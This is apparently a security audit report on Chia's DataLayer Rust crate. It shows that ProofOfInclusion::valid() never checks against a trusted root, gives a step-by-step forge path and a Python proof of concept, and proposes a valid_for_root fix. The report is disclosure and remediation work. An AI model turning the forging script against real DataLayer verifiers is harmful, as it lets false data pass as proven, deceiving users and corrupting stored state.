### Title
`ProofOfInclusion::valid()` Does Not Verify Against an External Root Hash — Forged Inclusion Proofs Always Pass — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate only checks the internal self-consistency of the hash chain stored inside the proof struct. It never compares the computed root against any externally-supplied, trusted tree root. Because `root_hash()` is derived entirely from the proof's own `combined_hash` field, the final equality check in `valid()` is a tautology that is always `true` when the loop completes. An attacker can construct an arbitrary, internally-consistent `ProofOfInclusion` for any `node_hash` they choose, and `valid()` will return `true` regardless of what the actual DataLayer tree root is.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
// crates/chia-datalayer/src/merkle/proof_of_inclusion.rs  lines 40-58
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {   // ← only checks internal consistency
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← tautology: always true here
}
```

`root_hash()` is:

```rust
// lines 32-38
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← taken directly from the proof itself
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds the `calculated_hash` from the last iteration. The loop body already asserted `calculated_hash == layer.combined_hash`, so `existing_hash` is definitionally equal to `last.combined_hash`. Therefore `existing_hash == self.root_hash()` reduces to `last.combined_hash == last.combined_hash`, which is always `true`. The final guard provides zero additional security.

**Forge path (no cryptographic break required):**

1. Choose any target leaf hash `H` (e.g., the hash of a key the attacker wants to falsely prove is present).
2. Choose any `other_hash` `O` and `other_hash_side` `S`.
3. Compute `C = calculate_internal_hash(H, S, O)` — this is just `sha256(b"\x02" || left || right)`.
4. Construct:
   ```
   ProofOfInclusion {
       node_hash: H,
       layers: [ ProofOfInclusionLayer { other_hash_side: S, other_hash: O, combined_hash: C } ]
   }
   ```
5. Call `proof.valid()` → returns `true`.
6. Call `proof.root_hash()` → returns `C`, a hash the attacker computed freely.

The struct is fully deserializable from untrusted bytes via the `Streamable` derive and the `from_bytes` / `from_json_dict` Python bindings, so any network peer can submit a crafted `ProofOfInclusion`.

### Impact Explanation

Any caller that validates an externally-received `ProofOfInclusion` using only `proof.valid()` — the sole validation method on the type — will accept forged proofs. The attacker can prove that an arbitrary key/value pair is present in a DataLayer tree whose actual root does not contain that key. This enables:

- **Forged inclusion proofs**: proving a key is in a tree when it is not, corrupting DataLayer state integrity.
- **Forged exclusion bypass**: a proof with zero layers and `node_hash = H` passes `valid()` and reports `root_hash() == H`; callers relying on `valid()` alone cannot distinguish this from a legitimate single-leaf tree.

This matches the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."*

### Likelihood Explanation

`ProofOfInclusion` is exposed to Python as a first-class serializable type (`from_bytes`, `from_json_dict`, `to_bytes`) with `valid()` as its only verification method. There is no `valid_for_root(expected: Hash)` API. The natural, idiomatic usage is `assert proof.valid()`, which is exactly what all internal tests do. Any downstream Python code in `chia-blockchain` that receives a proof over the network and calls `proof.valid()` without a separate `proof.root_hash() == trusted_root` check is fully exploitable by an unprivileged peer.

### Recommendation

Replace the tautological final check with a comparison against a caller-supplied trusted root. The simplest fix is to add a `valid_for_root` method and deprecate the rootless `valid()`:

```rust
pub fn valid_for_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // ← compare against the EXTERNAL trusted root
}
```

All call sites — including the Python binding `py_valid()` — should be updated to supply the trusted root obtained from `MerkleBlob::get_root_hash()` or an on-chain commitment, not from the proof itself.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side
from hashlib import sha256

# Arbitrary target leaf hash the attacker wants to "prove" is in the tree
H = bytes([0xAA] * 32)
O = bytes([0xBB] * 32)

# Compute combined_hash = sha256(b"\x02" + H + O)  (Side.Right means hash = sha256("\x02" + H + O))
C = sha256(b"\x02" + H + O).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=Side.Right,   # H is left child
    other_hash=O,
    combined_hash=C,
)
proof = ProofOfInclusion(node_hash=H, layers=[layer])

assert proof.valid()          # ← passes, no real tree involved
assert proof.root_hash() == C # ← attacker-controlled root
print("Forged proof accepted by valid():", proof.valid())
```

The forged proof passes `valid()` without any interaction with a real `MerkleBlob`. Any verifier that trusts `proof.valid()` alone will accept this as a legitimate inclusion proof for leaf `H` under root `C`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L8-29)
```rust
#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L61-72)
```rust
#[cfg(feature = "py-bindings")]
#[pymethods]
impl ProofOfInclusion {
    #[pyo3(name = "root_hash")]
    pub fn py_root_hash(&self) -> Hash {
        self.root_hash()
    }
    #[pyo3(name = "valid")]
    pub fn py_valid(&self) -> bool {
        self.valid()
    }
}
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L57-62)
```rust
pub fn calculate_internal_hash(hash: &Hash, other_hash_side: Side, other_hash: &Hash) -> Hash {
    match other_hash_side {
        Side::Left => internal_hash(other_hash, hash),
        Side::Right => internal_hash(hash, other_hash),
    }
}
```

**File:** wheel/python/chia_rs/datalayer.pyi (L237-266)
```text
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```
